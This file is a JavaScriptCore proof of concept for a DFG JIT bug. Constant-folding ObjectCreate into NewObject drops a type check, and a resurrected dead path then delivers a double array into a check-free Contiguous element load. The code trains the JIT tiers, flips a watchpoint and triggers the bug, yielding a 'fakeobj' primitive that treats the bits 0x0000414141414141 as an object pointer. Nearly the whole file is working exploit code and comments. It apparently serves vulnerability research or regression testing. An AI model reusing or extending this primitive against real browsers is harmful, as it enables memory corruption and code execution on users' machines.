// Variant of rdar://178211104 for the ObjectCreate -> NewObject fold in
// DFGConstantFoldingPhase.cpp.
//
// FixupPhase:    ObjectCreate child1 prediction = SpecObject -> fixEdge<ObjectUse>(child1)
// CFA:           child1 proven = jsNull (heap watchpoint on G.k) -> ObjectUse ∩ {null} = ⊥
//                -> block tail dead, merges nothing into loop header valuesAtHead
// ConstantFold:  forNode(child1).m_value == null -> nullPrototypeObjectStructure()
//                -> convertToNewObject() -> children.reset()  (ObjectUse edge GONE,
//                no insertCheck) -> path resurrected after lower-index header was
//                already folded against stale {ArrayWithContiguous}-only state.
//
// Payload: structure-check-free Contiguous element load on an ArrayWithDouble
// butterfly -> raw bits 0x0000414141414141 returned as a JSCell*.

// ---- knobs -------------------------------------------------------------
const N_PROTO = 4;
const N_HOLDER = 64;
const TRAIN_GETKEY = 3000;
const TRAIN_CALLER = 60;
const TRAIN_GETK2 = 3000;
const RAMP = 200000;

// ---- helpers -----------------------------------------------------------
function bitsToDouble(hi, lo) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = lo >>> 0;
    u32[1] = hi >>> 0;
    return f64[0];
}

function enforce(input)
{
    return String(input);
}
noInline(enforce);

// Raw double whose bit pattern is 0x0000414141414141.
// As a JSValue (top 15 bits zero, OtherTag bit clear) this is a JSCell* to 0x414141414141.
const FAKE = bitsToDouble(0x00004141, 0x41414141);
enforce("FAKE double = " + FAKE + "  (bits 0x0000414141414141)");

// ---- the players -------------------------------------------------------
const PROTOS = [];
for (let i = 0; i < N_PROTO; i++) PROTOS.push({ ["p" + i]: i });

const G = { k: PROTOS[0] };

function getKey(holder) { return holder.k; }

function getK2(x) { return x.k; }
noInline(getK2);

const INNER = { y: 1, z: 2 };

function caller(o, p, skip, n) {
    if (skip) return 0;
    let obj = [INNER, INNER];        // ArrayWithContiguous (S1)
    let result = 0;
    let v = false;
    for (let i = 0; i < n; i++) {
        // Two non-array uses of `obj` so TypeCheckHoisting's vote ratio for loc(obj)
        // drops below 1.0 (1 StructureCheck vote vs 2 Other votes) and the
        // CheckStructure({Contiguous}) is NOT hoisted to the SetLocal in the
        // else-branch (which would otherwise OSR-exit on the Double array).
        v = (obj === o);
        v = (obj === o) | v;
        result = obj[0];             // payload: GetByVal, ArrayMode=Contiguous, CheckStructure elided
        if (p) {
            obj = [INNER, INNER];    // S1 again
        } else {
            obj = [FAKE, 1.1];       // ArrayWithDouble (S2) — only on the CFA-dead path
            Object.create(getKey(G));// ObjectCreate(ObjectUse:getKey(G)); AI proto = null -> contradiction
        }
    }
    return v ? 0 : result;
}
noInline(caller);

// ---- training ----------------------------------------------------------

// 1. make getKey's `holder.k` IC give up (megamorphic) with an Object-only value profile
const holders = [];
for (let i = 0; i < N_HOLDER; i++) {
    const h = {};
    h["u" + i] = i;
    h.k = PROTOS[i % N_PROTO];
    holders.push(h);
}
function trainGetKey() {
    let acc = 0;
    for (let i = 0; i < TRAIN_GETKEY; i++)
        if (typeof getKey(holders[i % N_HOLDER]) === "object") acc++;
    return acc;
}
noInline(trainGetKey);
trainGetKey();

// 2. warm caller in baseline:
//    - p=true,  n=2 : payload sees only Contiguous arrays (both iterations)
//    - p=false, n=1 : payload sees only Contiguous (iteration 0), then else branch
//                     runs once (links getKey call IC so it's inlinable, runs
//                     Object.create on an actual object), and the loop exits
//                     BEFORE the Double array reaches the payload.
const O = { a: 1 };
function trainCaller() {
    for (let i = 0; i < TRAIN_CALLER; i++) {
        caller(O, true,  false, 2);
        caller(O, false, false, 1);
    }
}
noInline(trainCaller);
trainCaller();

// 3. flip G.k to null (Reflect.set: no put_by_id IC caches the replace ->
//    the (StructureOf(G), "k") replacement watchpoint set is not pre-fired)
Reflect.set(G, "k", null);

// 4. create a still-valid (S_G,"k") replacement watchpoint AFTER the last write,
//    so Graph::tryGetConstantProperty returns jsNull() at compile time
function trainGetK2() {
    let acc = 0;
    for (let i = 0; i < TRAIN_GETK2; i++)
        if (getK2(G) === null) acc++;
    return acc;
}
noInline(trainGetK2);
trainGetK2();

// 5. tier caller up to DFG without touching any profile
function ramp() {
    for (let i = 0; i < RAMP; i++)
        caller(O, true, true, 2);
}
noInline(ramp);
ramp();

// 6. trigger: resurrected path delivers an ArrayWithDouble into the payload,
//    which was compiled as a check-free Contiguous element load.
//    Iteration 0 reads INNER (Contiguous), iteration 1 reads FAKE bits as a cell.
enforce("triggering...");
const r = caller(O, false, false, 2);

// `r` is now a JSValue whose raw bits are 0x0000414141414141: the JIT loaded
// element 0 of an ArrayWithDouble through a structure-check-free Contiguous
// GetByVal. Top 15 bits are zero and the OtherTag bit is clear, so the engine
// treats it as a JSCell* to 0x414141414141. Any cell use dereferences it.
enforce("caller returned a JSValue; using it as a cell -> deref 0x414141414141...");
enforce("r.y = " + r.y);
enforce(describe(r));
enforce("*** if you see this, the fakeobj primitive did NOT trigger ***");
